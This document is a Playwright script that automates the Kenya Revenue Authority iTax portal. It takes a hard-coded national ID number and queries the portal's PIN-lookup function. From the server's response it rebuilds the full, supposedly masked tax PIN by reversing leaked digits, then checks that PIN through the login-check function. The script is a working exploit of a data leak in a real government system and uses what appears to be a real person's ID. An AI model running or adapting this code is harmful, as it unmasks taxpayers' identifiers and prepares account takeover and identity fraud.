const { chromium } = require('playwright');

(async () => {
    const browser = await chromium.launch({
        headless: true, // set false to see browser
        // channel: 'chrome'
    });

    const context = await browser.newContext();
    const page = await context.newPage();

    // 1️⃣ Load iTax portal
    await page.goto('https://itax.kra.go.ke/KRA-Portal/', {
        waitUntil: 'networkidle',
    });

    // 2️⃣ Wait for DWR engine & interface to be ready
    await page.waitForFunction(() => {
        return (
            window.dwr &&
            window.dwr.engine &&
            window.findPinByIdno &&
            typeof window.findPinByIdno.findPinByIdnumber === 'function'
        );
    });

    console.log('✅ DWR engine ready');

    const idNumber = '37708940';

    // 3️⃣ Call DWR function and reconstruct full PIN (same logic as browser)
    const fullPinData = await page.evaluate((id) => {
        return new Promise((resolve, reject) => {
            try {
                findPinByIdno.findPinByIdnumber(id, function (response) {
                    if (response && response.includes('#$')) {
                        // Parse response: "A01*****60E#$07476"
                        const parts = response.split('#$');
                        const maskedPin = parts[0];  // "A01*****60E"
                        const reversedDigits = parts[1];  // "07476"

                        // Reverse the digits (same as browser does)
                        const actualDigits = reversedDigits.split('').reverse().join('');

                        // Reconstruct full PIN
                        const fullPin = maskedPin.replace('*****', actualDigits);

                        resolve({
                            maskedResponse: response,
                            maskedPin: maskedPin,
                            fullPin: fullPin,
                            idNumber: id
                        });
                    } else {
                        resolve({
                            maskedResponse: response,
                            error: 'Invalid response format or no PIN found'
                        });
                    }
                });
            } catch (e) {
                reject(e.toString());
            }
        });
    }, idNumber);

    console.log('\n� PIN Extraction Results:');
    console.log('  ID Number:', fullPinData.idNumber);
    console.log('  Masked Response:', fullPinData.maskedResponse);
    console.log('  🔓 Full PIN:', fullPinData.fullPin);

    // 4️⃣ Validate the reconstructed PIN
    if (fullPinData.fullPin) {
        const loginCheck = await page.evaluate((pin) => {
            return new Promise((resolve, reject) => {
                try {
                    CheckLoginPin.checkLoginPin(pin, function (response) {
                        resolve(response);
                    });
                } catch (e) {
                    reject(e.toString());
                }
            });
        }, fullPinData.fullPin);

        console.log('  Validation Status:', loginCheck);
    }

    console.log('\n✅ Complete!\n');

    await browser.close();
})();
